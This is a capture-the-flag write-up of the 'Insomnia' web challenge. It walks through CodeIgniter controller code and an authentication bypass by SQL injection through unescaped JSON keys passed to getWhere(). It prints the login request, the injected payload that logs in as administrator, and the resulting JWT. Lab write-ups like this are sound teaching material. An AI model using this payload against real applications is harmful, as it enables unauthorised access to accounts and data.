---
authors:
    - Lukas Daubner
date: 16-01-2024
---

# Web: Insomnia

Insomnia is a simple webpage that allows registration, login and nothing else.

## Code

Interestingly, the code is really messy. There are a lot of superfluous stuff (logs from development) and lots of framework template files. But that is nice on one hand, as that is often the reality.

Without much delay, let's get straight to the controllers.

```
# Insomnia/app/Controllers/ProfileController.php
public function index()
{
	\$token = (string) \$_COOKIE["token"] ?? null;
	\$flag = file_get_contents(APPPATH . "/../flag.txt");
	if (isset(\$token)) {
		\$key = (string) getenv("JWT_SECRET");
		\$jwt_decode = JWT::decode(\$token, new Key(\$key, "HS256"));
		\$username = \$jwt_decode->username;
		if (\$username == "administrator") {
			return view("ProfilePage", [
				"username" => \$username,
				"content" => \$flag,
			]);
		} else {
			\$content = "Haven't seen you for a while";
			return view("ProfilePage", [
				"username" => \$username,
				"content" => \$content,
			]);
		}
	}
}
```

This is interesting, as it gives a clear goal to log on as administrator.

Next, the `UserController` handles the register and login procedure. Both registration and login looks legit.

The first idea is to try various attacks on JWT. For example simply changing the `username` in payload, specifying `None` as algorithm and so on. However, they use maintained library for JWT, which is resistant to these trivial attacks.

It must be something else.

## Vulnerability

Since I have not known the CodeIgniter framework that is used here, I looked it up. And found out an interesting and unexpected vulnerability. https://liveoverflow.com/authentication-bypassing-in-codeigniter-due-to-empty-where-clause/

SQL injection is possible in `\$builder->getWhere()` with JSON data. Which is exactly what is in the app.

```
# Insomnia/app/Controllers/UserController.php
public function login()
{
	\$db = db_connect();
...
	\$query = \$db->table("users")->getWhere(\$json_data, 1, 0);
	\$result = \$query->getRowArray();
	if (!\$result) {
		return \$this->respond("User not found", 404);
	} else {
...
}
```

The data submitted in the JSON is not escaped. So it can be used to bypass authentication.

## Payload

So, the payload is simple. Take the login request.

```
POST /index.php/login HTTP/1.1
Host: 94.237.58.148:52062
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Length: 45

{"username":"razzmann","password":"razzmann"}
```

And change it so the result will pass the `else` statement.

```
{"username":"administrator", "\" or 1=1 -- -":"razzmann"}
```

That gives successful login as administrator with a nice JWT token.

```
{"message":"Login Succesful","token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3MTE0NTc0ODYsImV4cCI6MTcxMTQ5MzQ4NiwidXNlcm5hbWUiOiJhZG1pbmlzdHJhdG9yIn0.R-ScAZmuqXVn-JypHZAQXRePZEVCdW7ftkdHuZECMys"}
```

With this token, simply access the `/profile` and collect the flag.